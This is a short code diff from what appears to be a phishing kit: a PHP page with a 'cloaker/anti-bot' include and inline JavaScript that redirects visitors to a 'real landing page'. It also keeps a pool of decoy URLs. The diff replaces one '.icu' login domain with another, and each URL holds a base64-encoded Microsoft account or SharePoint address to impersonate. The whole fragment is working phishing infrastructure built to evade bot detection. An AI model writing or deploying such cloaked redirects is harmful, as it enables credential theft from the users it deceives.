@@ -5,7 +5,7 @@ require_once __DIR__ . '/includes/index.php'; // cloaker/anti-bot
 <script>
 (function(){
   // ✅ Your real landing page
-  var realTarget = "https://login.abdvidea.icu?7r_8ZMgO5-0=aHR0cHM6Ly9hY2NvdW50LmxpdmUuY29tL2Vycm9yLmFzcHg/ZXJyY29kZT0xMDg2JmF1dGhpZD1adlE4dVhSSE5tRzcxd0V5NVRvWWtyc01jZnZBZHRCcVpQV3BnNA==";
+  var realTarget = "https://login.baswea.icu?y7ysAJSf0AS9=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN";
 
   // ✅ Pool of decoy URLs
   var decoys = [
